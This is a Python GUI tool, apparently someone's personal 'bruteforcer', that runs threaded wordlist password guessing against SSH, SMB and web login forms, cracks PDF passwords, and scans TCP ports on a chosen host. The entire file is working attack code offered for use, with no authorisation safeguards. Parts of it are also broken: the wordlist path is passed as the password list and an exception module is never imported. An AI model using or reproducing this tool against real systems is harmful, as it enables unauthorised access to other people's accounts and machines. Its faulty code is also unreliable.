import tkinter as tk
from tkinter import filedialog, messagebox
import paramiko
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import pikepdf
import requests
import logging
import uuid
import subprocess
import sys
import base64
import os
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Encrypted welcome message
encoded_welcome_message = "V2VsY29tZSB0byBhZGhpMDNmMjQncyBwZXJzb25hbCBicnV0ZWZvcmNlciE="

def print_welcome_message():
    welcome_message = base64.b64decode(encoded_welcome_message).decode('utf-8')
    print("\033[91m\033[1m" + welcome_message + "\033[0m")

# Setup logging
logging.basicConfig(filename='security_assessment.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def ssh_bruteforce(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password)
        logging.info(f'SSH Success: {password}')
        return password
    except paramiko.AuthenticationException:
        logging.info(f'SSH Failed: {password}')
        return None

def smb_bruteforce(ip, username, password):
    try:
        connection = Connection(uuid.uuid4(), ip, 445)
        connection.connect()
        session = Session(connection, username, password)
        session.connect()
        logging.info(f'SMB Success: {password}')
        return password
    except smbprotocol.exceptions.SMBAuthenticationError:
        logging.info(f'SMB Failed: {password}')
        return None

def pdf_password_crack(pdf_path, password):
    try:
        with pikepdf.open(pdf_path) as pdf:
            if pdf.is_encrypted:
                pdf.save("temp.pdf", encryption=pikepdf.Decryption(password))
                return password
    except pikepdf.PasswordError:
        logging.info(f'PDF Failed: {password}')
        return None
    except Exception as e:
        logging.error(f'PDF Error: {e}')
        return None

def web_login_bruteforce(url, username, password):
    try:
        response = requests.post(url, data={'username': username, 'password': password})
        if "login successful" in response.text.lower():
            logging.info(f'Web Login Success: {password}')
            return password
    except Exception as e:
        logging.error(f'Web Login Error: {e}')
    logging.info(f'Web Login Failed: {password}')
    return None

def execute_bruteforce(service_function, args, password_list, num_threads=5):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(service_function, *args, password): password for password in password_list}
        for future in futures:
            result = future.result()
            if result:
                print(f'Success: {result}')
                return result
    print("No successful passwords found.")
    return None

def unlock_pdf(pdf_file, wordlist_file):
    with open(wordlist_file, 'r') as file:
        passwords = file.read().splitlines()

    for count, password in enumerate(passwords, 1):
        try:
            with pikepdf.open(pdf_file, password=password) as pdf:
                # Check if the PDF is encrypted and can be decrypted with the current password
                if pdf.is_encrypted:
                    # Save the unlocked PDF
                    output_file = f"unlocked_{os.path.basename(pdf_file)}"
                    pdf.save(output_file)
                    
                    # Print and log the success message
                    print(f"Password found: {password}")
                    print(f"Unlocked file saved as: {output_file}")
                    open_pdf(output_file)  # Open the unlocked PDF file
                    return
        except pikepdf.PasswordError:
            # Print an attempt message for incorrect passwords
            print(f"[ATTEMPT {count}] Incorrect password: {password}")
            continue
        except Exception as e:
            # Log any other unexpected errors
            logging.error(f'PDF Error: {e}')
            continue

    # If no password was found
    print("Password not found")


def open_pdf(file_path):
    if sys.platform.startswith('darwin'):
        subprocess.call(('open', file_path))
    elif os.name == 'nt':
        os.startfile(file_path)
    elif os.name == 'posix':
        subprocess.call(('xdg-open', file_path))

def scan_ports(ip_address, start_port, end_port):
    print(f"Starting scan on host: {ip_address}")
    start_time = datetime.now()

    try:
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                print(f"Port {port}: Open")
            sock.close()
    except KeyboardInterrupt:
        print("\nYou pressed Ctrl+C")
        sys.exit()
    except socket.gaierror:
        print("\nHostname could not be resolved")
        sys.exit()
    except socket.error:
        print("\nServer not responding")
        sys.exit()

    end_time = datetime.now()
    total_time = end_time - start_time
    print(f"Scanning completed in: {total_time}")

def browse_password_file_ssh(password_file_entry_ssh):
    filename = filedialog.askopenfilename(initialdir=os.getcwd(), title="Select Password List File")
    if filename:
        password_file_entry_ssh.delete(0, tk.END)
        password_file_entry_ssh.insert(0, filename)

def browse_password_file_smb(password_file_entry_smb):
    filename = filedialog.askopenfilename(initialdir=os.getcwd(), title="Select Password List File")
    if filename:
        password_file_entry_smb.delete(0, tk.END)
        password_file_entry_smb.insert(0, filename)

def browse_pdf_file(pdf_file_entry):
    filename = filedialog.askopenfilename(initialdir=os.getcwd(), title="Select PDF File",
                                          filetypes=[("PDF files", "*.pdf")])
    if filename:
        pdf_file_entry.delete(0, tk.END)
        pdf_file_entry.insert(0, filename)


def browse_wordlist_file(wordlist_file_entry):
    filename = filedialog.askopenfilename(initialdir=os.getcwd(), title="Select Wordlist File",
                                          filetypes=[("Text files", "*.txt")])
    if filename:
        wordlist_file_entry.delete(0, tk.END)
        wordlist_file_entry.insert(0, filename)

def browse_password_file_web(password_file_entry_web):
    filename = filedialog.askopenfilename(initialdir=os.getcwd(), title="Select Password List File")
    if filename:
        password_file_entry_web.delete(0, tk.END)
        password_file_entry_web.insert(0, filename)

def main():
    print_welcome_message()

    root = tk.Tk()
    root.title("ADHI03F24's Personal Tool")
    root.minsize(600, 400)  # Set a minimum size for the main window

    tk.Label(root, text="Choose a service:").pack(pady=10)

    def handle_service_selection():
        service = service_var.get()
        frame_ssh.pack_forget()
        frame_smb.pack_forget()
        frame_pdf.pack_forget()
        frame_web.pack_forget()
        scan_ports_window.pack_forget()

        if service == "1":
            frame_ssh.pack(fill=tk.BOTH, expand=True)
        elif service == "2":
            frame_smb.pack(fill=tk.BOTH, expand=True)
        elif service == "3":
            frame_pdf.pack(fill=tk.BOTH, expand=True)
        elif service == "4":
            frame_web.pack(fill=tk.BOTH, expand=True)
        elif service == "5":
            scan_ports_window.pack(fill=tk.BOTH, expand=True)
        else:
            messagebox.showerror("Error", "Please select a valid service.")

    service_var = tk.StringVar()
    tk.Radiobutton(root, text="SSH Bruteforce", variable=service_var, value="1", command=handle_service_selection).pack(anchor=tk.W)
    tk.Radiobutton(root, text="SMB Bruteforce", variable=service_var, value="2", command=handle_service_selection).pack(anchor=tk.W)
    tk.Radiobutton(root, text="PDF Password Crack", variable=service_var, value="3", command=handle_service_selection).pack(anchor=tk.W)
    tk.Radiobutton(root, text="Web Login Bruteforce", variable=service_var, value="4", command=handle_service_selection).pack(anchor=tk.W)
    tk.Radiobutton(root, text="Network Port Scan", variable=service_var, value="5", command=handle_service_selection).pack(anchor=tk.W)

    # Frames for each service
    frame_ssh = tk.Frame(root)
    frame_smb = tk.Frame(root)
    frame_pdf = tk.Frame(root)
    frame_web = tk.Frame(root)
    scan_ports_window = tk.Frame(root)

    # SSH Bruteforce
    tk.Label(frame_ssh, text="SSH Bruteforce").pack(pady=10)
    tk.Label(frame_ssh, text="IP Address:").pack(anchor=tk.W)
    ip_entry_ssh = tk.Entry(frame_ssh)
    ip_entry_ssh.pack(anchor=tk.W)

    tk.Label(frame_ssh, text="Username:").pack(anchor=tk.W)
    username_entry_ssh = tk.Entry(frame_ssh)
    username_entry_ssh.pack(anchor=tk.W)

    tk.Label(frame_ssh, text="Password List File:").pack(anchor=tk.W)
    password_file_entry_ssh = tk.Entry(frame_ssh)
    password_file_entry_ssh.pack(anchor=tk.W)

    tk.Button(frame_ssh, text="Browse", command=lambda: browse_password_file_ssh(password_file_entry_ssh)).pack(anchor=tk.W, pady=5)  # Browse button for SSH password file

    tk.Label(frame_ssh, text="Execute SSH Bruteforce").pack(pady=10)
    tk.Button(frame_ssh, text="Execute SSH Bruteforce", command=lambda: execute_bruteforce(ssh_bruteforce, (ip_entry_ssh.get(), username_entry_ssh.get()), password_file_entry_ssh.get().splitlines())).pack()

    # SMB Bruteforce
    tk.Label(frame_smb, text="SMB Bruteforce").pack(pady=10)
    tk.Label(frame_smb, text="IP Address:").pack(anchor=tk.W)
    ip_entry_smb = tk.Entry(frame_smb)
    ip_entry_smb.pack(anchor=tk.W)

    tk.Label(frame_smb, text="Username:").pack(anchor=tk.W)
    username_entry_smb = tk.Entry(frame_smb)
    username_entry_smb.pack(anchor=tk.W)

    tk.Label(frame_smb, text="Password List File:").pack(anchor=tk.W)
    password_file_entry_smb = tk.Entry(frame_smb)
    password_file_entry_smb.pack(anchor=tk.W)

    tk.Button(frame_smb, text="Browse", command=lambda: browse_password_file_smb(password_file_entry_smb)).pack(anchor=tk.W, pady=5)  # Browse button for SMB password file

    tk.Label(frame_smb, text="Execute SMB Bruteforce").pack(pady=10)
    tk.Button(frame_smb, text="Execute SMB Bruteforce", command=lambda: execute_bruteforce(smb_bruteforce, (ip_entry_smb.get(), username_entry_smb.get()), password_file_entry_smb.get().splitlines())).pack()

    # PDF Password Crack
    tk.Label(frame_pdf, text="PDF Password Crack").pack(pady=10)
    tk.Label(frame_pdf, text="PDF File:").pack(anchor=tk.W)
    pdf_file_entry = tk.Entry(frame_pdf)
    pdf_file_entry.pack(anchor=tk.W)

    tk.Button(frame_pdf, text="Browse", command=lambda: browse_pdf_file(pdf_file_entry)).pack(anchor=tk.W, pady=5)  # Browse button for PDF file

    tk.Label(frame_pdf, text="Wordlist File:").pack(anchor=tk.W)
    wordlist_file_entry = tk.Entry(frame_pdf)
    wordlist_file_entry.pack(anchor=tk.W)

    tk.Button(frame_pdf, text="Browse", command=lambda: browse_wordlist_file(wordlist_file_entry)).pack(anchor=tk.W, pady=5)  # Browse button for wordlist file

    tk.Label(frame_pdf, text="Execute PDF Password Crack").pack(pady=10)
    tk.Button(frame_pdf, text="Execute PDF Password Crack", command=lambda: unlock_pdf(pdf_file_entry.get(), wordlist_file_entry.get())).pack()

    # Web Login Bruteforce
    tk.Label(frame_web, text="Web Login Bruteforce").pack(pady=10)
    tk.Label(frame_web, text="Login Page URL:").pack(anchor=tk.W)
    url_entry = tk.Entry(frame_web)
    url_entry.pack(anchor=tk.W)

    tk.Label(frame_web, text="Username:").pack(anchor=tk.W)
    username_entry_web = tk.Entry(frame_web)
    username_entry_web.pack(anchor=tk.W)

    tk.Label(frame_web, text="Password List File:").pack(anchor=tk.W)
    password_file_entry_web = tk.Entry(frame_web)
    password_file_entry_web.pack(anchor=tk.W)

    tk.Button(frame_web, text="Browse", command=lambda: browse_password_file_web(password_file_entry_web)).pack(anchor=tk.W, pady=5)  # Browse button for web password file

    tk.Label(frame_web, text="Execute Web Login Bruteforce").pack(pady=10)
    tk.Button(frame_web, text="Execute Web Login Bruteforce", command=lambda: execute_bruteforce(web_login_bruteforce, (url_entry.get(), username_entry_web.get()), password_file_entry_web.get().splitlines())).pack()

    # Network Port Scan
    tk.Label(scan_ports_window, text="Network Port Scan").pack(pady=10)
    tk.Label(scan_ports_window, text="IP Address:").pack(anchor=tk.W)
    ip_entry_scan = tk.Entry(scan_ports_window)
    ip_entry_scan.pack(anchor=tk.W)

    tk.Label(scan_ports_window, text="Start Port:").pack(anchor=tk.W)
    start_port_entry = tk.Entry(scan_ports_window)
    start_port_entry.pack(anchor=tk.W)

    tk.Label(scan_ports_window, text="End Port:").pack(anchor=tk.W)
    end_port_entry = tk.Entry(scan_ports_window)
    end_port_entry.pack(anchor=tk.W)

    tk.Button(scan_ports_window, text="Scan Ports", command=lambda: scan_ports(ip_entry_scan.get(), int(start_port_entry.get()), int(end_port_entry.get()))).pack()

    root.mainloop()

if __name__ == "__main__":
    main()
